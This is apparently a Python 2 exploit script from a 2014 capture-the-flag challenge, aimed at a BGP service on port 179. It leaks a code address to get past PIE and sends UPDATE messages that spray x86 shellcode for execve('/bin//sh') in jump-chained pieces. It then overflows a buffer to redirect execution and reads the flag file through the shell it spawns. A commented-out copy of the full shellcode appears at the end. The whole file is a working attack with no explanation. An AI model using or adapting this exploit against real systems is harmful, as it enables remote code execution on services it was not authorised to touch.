import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = 'bbgp_7cdbfdae936b3c6ed10588119a8279a0.2014.shallweplayaga.me'
#host = '10.211.55.5'
port = 179

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

s = ""
s += "\xff" * 16
s += "\xAA" * 2
s += "\x01" # OPEN
s += "\x04" # version
s += "\xBB" * 8
s += "\x08" # optional len
s += "\x02"
s += "\x06"
s += "\x01"
s += "\x04"
s += "\x00"
s += "\x01"
s += "\x00"
s += "\x01"

f.write(s)
#res = f.read(123)

f.read(0x25) #check_open
f.read(0x13) #send_alive
f.read(42) #init_rib
#offset = 0x25 + 0x13 + 42
pie_base = up(f.read(4)) - 0x4068
ret_addr = pie_base + 0x40c0 + 76
print "[!]pie_base = " + hex(pie_base)

raw_input()

add = "\xff" * 16
add += "\x00\x23"
add += "\x02"
add += "\x00" * 2
add += "\x00\x07"
add += "\x00\x03\x04"
add += "\x90\x90\xeb\x44\x20"
add += "\x31\xd2\x52\x90"

f.write(add)

add = "\xff" * 16
add += "\x00\x23"
add += "\x02"
add += "\x00" * 2
add += "\x00\x07"
add += "\x00\x03\x04"
add += "\x68\x90\xeb\x44\x20"
add += "\x68\x6e\x2f\x73"

f.write(add)

add = "\xff" * 16
add += "\x00\x23"
add += "\x02"
add += "\x00" * 2
add += "\x00\x07"
add += "\x00\x03\x04"
add += "\x69\x90\xeb\x44\x20"
add += "\x68\x2f\x2f\x62"

f.write(add)

add = "\xff" * 16
add += "\x00\x23"
add += "\x02"
add += "\x00" * 2
add += "\x00\x07"
add += "\x00\x03\x04"
add += "\x89\xe1\xeb\x44\x20"
add += "\x89\xe3\x52\x53"

f.write(add)

add = "\xff" * 16
add += "\x00\x23"
add += "\x02"
add += "\x00" * 2
add += "\x00\x07"
add += "\x00\x03\x04"
add += "\x80\x90\x90\x90\x20"
add += "\x8d\x42\x0b\xcd"

f.write(add)

update = "\xff" * 16
update += "\x00\x2e"  # total length
update += "\x02" # update

update += "\x00" * 2 # withdraw length
update += "\x00\x17" # left length

update += "\x00\x04\x14"
update += "A" * 16
update += p(ret_addr)

f.write(update)

f.write("cat /home/bbgp/flag\n")

print f.read(1024)

#raw_input()

#shellcode = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
#print len(shellcode)

